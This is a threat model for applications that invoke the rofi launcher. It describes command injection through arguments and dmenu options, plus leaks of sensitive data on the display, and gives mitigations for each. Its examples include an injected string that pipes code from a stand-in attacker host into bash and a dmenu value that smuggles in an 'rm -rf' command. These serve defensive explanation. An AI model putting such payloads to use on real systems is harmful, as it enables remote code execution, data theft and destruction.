# Threat Model Analysis for davatorium/rofi

## Threat: [Command Injection via Rofi Arguments](./threats/command_injection_via_rofi_arguments.md)

**Description:** An attacker could manipulate user input or application logic to inject malicious commands into the arguments passed directly to the `rofi` executable. This allows for the execution of arbitrary shell commands when `rofi` is invoked by the application. For example, injecting `"; curl attacker.com/steal_data | bash"` into a dynamically constructed command.

**Impact:**  Arbitrary command execution on the server, potentially leading to full system compromise, data breaches, data exfiltration, or denial of service.

**Affected Component:** `rofi` command-line argument parsing and execution.

**Risk Severity:** Critical

**Mitigation Strategies:**
* Implement strict input validation and sanitization for all data used to construct `rofi` command-line arguments.
* Utilize allow-lists to restrict acceptable input values.
* Escape all special characters that could be interpreted by the shell.
* Avoid directly embedding user-provided input into `rofi` command strings.
* If possible, predefine a limited set of safe actions and map user input to these predefined actions.
* Run the application and the `rofi` process with the least necessary privileges.

## Threat: [Command Injection via Rofi Input (Dmenu Mode)](./threats/command_injection_via_rofi_input_(dmenu_mode).md)

**Description:** When using `rofi` in `-dmenu` mode, the application presents a list of options. An attacker could manipulate the *content* of the options provided to `rofi` such that selecting a seemingly benign option actually results in the execution of a malicious command when the application processes the selected output. For example, an option might be crafted as `Secure Action` but the underlying value is `secure_action ; rm -rf important_files`.

**Impact:** Arbitrary command execution on the server, similar to command injection via arguments, potentially leading to system compromise and data loss.

**Affected Component:** `rofi`'s `-dmenu` functionality and the application's logic for processing the selected output from `rofi`.

**Risk Severity:** Critical

**Mitigation Strategies:**
* Rigorously validate the output received from `rofi` before performing any actions based on it.
* Ensure the output strictly conforms to the expected format and content.
* Never directly execute the raw output of `rofi` as a shell command.
* Use the output as a secure identifier to look up predefined, safe actions within the application.
* Sanitize the input used to generate the `rofi` list to prevent the inclusion of potentially harmful commands.

## Threat: [Information Disclosure via Rofi Display](./threats/information_disclosure_via_rofi_display.md)

**Description:** The application might unintentionally display sensitive information directly within the `rofi` user interface. This could include API keys, passwords, internal system details, or other confidential data presented in the `-dmenu` list, prompts, or other visible elements of `rofi`. An attacker with access to the server's display or the `rofi` process's output could view this information.

**Impact:** Exposure of sensitive data, potentially leading to unauthorized access, further attacks, or privacy violations.

**Affected Component:** `rofi`'s display rendering functionality.

**Risk Severity:** High

**Mitigation Strategies:**
* Strictly avoid displaying sensitive information directly within the `rofi` interface.
* If sensitive information must be presented, explore alternative methods such as masking, obfuscation, or displaying only non-sensitive representations.
* Ensure that the `rofi` process is running in a secure context and its output is not accessible to unauthorized users or processes.
* Be aware of the potential for screen capture or physical observation of the `rofi` display in environments where this is a concern.

